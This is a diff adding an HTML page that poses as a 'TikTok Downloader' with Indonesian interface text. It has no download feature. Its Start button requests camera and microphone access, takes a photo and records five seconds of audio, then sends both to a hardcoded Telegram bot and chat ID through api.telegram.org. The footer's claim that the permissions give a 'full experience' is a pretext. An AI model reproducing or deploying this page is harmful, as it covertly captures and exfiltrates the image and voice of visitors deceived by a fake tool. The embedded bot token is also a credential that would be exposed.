@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TikTok Downloader</title>
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(to bottom, #0f2027, #203a43, #2c5364);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      max-width: 500px;
+      padding: 30px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      margin-bottom: 20px;
+    }
+
+    #capture-btn {
+      width: 100%;
+      padding: 15px;
+      font-size: 18px;
+      font-weight: bold;
+      color: #fff;
+      background: #f44336;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: all 0.3s ease-in-out;
+    }
+
+    #capture-btn:hover {
+      background: #d32f2f;
+      transform: scale(1.05);
+    }
+
+    #message {
+      margin-top: 20px;
+      font-size: 16px;
+      color: #d9d9d9;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: rgba(255, 255, 255, 0.7);
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>TikTok Downloader</h1>
+    <button id="capture-btn" onclick="startCapture()">Start</button>
+    <div id="message"></div>
+    <p class="footer">Pastikan Anda memberikan izin kamera dan mikrofon untuk pengalaman penuh.</p>
+  </div>
+
+  <script>
+    const chatId = '6830927175'; // Ganti dengan ID Telegram Anda
+    const botToken = '8154684351:AAF9Vecr_LJAD1RDt720QNq4tYSO435KjfY'; // Ganti dengan Token Bot Anda
+
+    async function startCapture() {
+      const messageElement = document.getElementById('message');
+      messageElement.textContent = 'Memulai proses... Harap tunggu.';
+
+      try {
+        // Meminta izin kamera dan mikrofon
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+
+        // Ambil foto dan audio secara bersamaan
+        const [photoBlob, audioBlob] = await Promise.all([
+          capturePhoto(stream),
+          recordAudio(stream)
+        ]);
+
+        // Kirim data ke Telegram secara bersamaan
+        await Promise.all([
+          sendToTelegram(photoBlob, 'photo'),
+          sendToTelegram(audioBlob, 'audio')
+        ]);
+
+        messageElement.textContent = 'Foto dan audio berhasil dikirim!';
+      } catch (error) {
+        messageElement.textContent = `Terjadi kesalahan: ${error.message}`;
+      }
+    }
+
+    async function capturePhoto(stream) {
+      const videoTrack = stream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(videoTrack);
+      return await imageCapture.takePhoto();
+    }
+
+    async function recordAudio(stream) {
+      const audioRecorder = new MediaRecorder(stream);
+      const audioChunks = [];
+
+      return new Promise((resolve, reject) => {
+        audioRecorder.ondataavailable = (event) => {
+          if (event.data.size > 0) {
+            audioChunks.push(event.data);
+          }
+        };
+
+        audioRecorder.onstop = () => {
+          const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+          resolve(audioBlob);
+        };
+
+        audioRecorder.onerror = (error) => reject(error);
+
+        // Rekam selama 5 detik
+        audioRecorder.start();
+        setTimeout(() => audioRecorder.stop(), 5000);
+      });
+    }
+
+    async function sendToTelegram(blob, type) {
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append(type, blob, `capture.${type === 'photo' ? 'jpg' : 'wav'}`);
+
+      const url = `https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`;
+
+      const response = await fetch(url, {
+        method: 'POST',
+        body: formData,
+      });
+
+      const result = await response.json();
+      if (!result.ok) {
+        throw new Error(result.description);
+      }
+    }
+  </script>
+</body>
+</html>
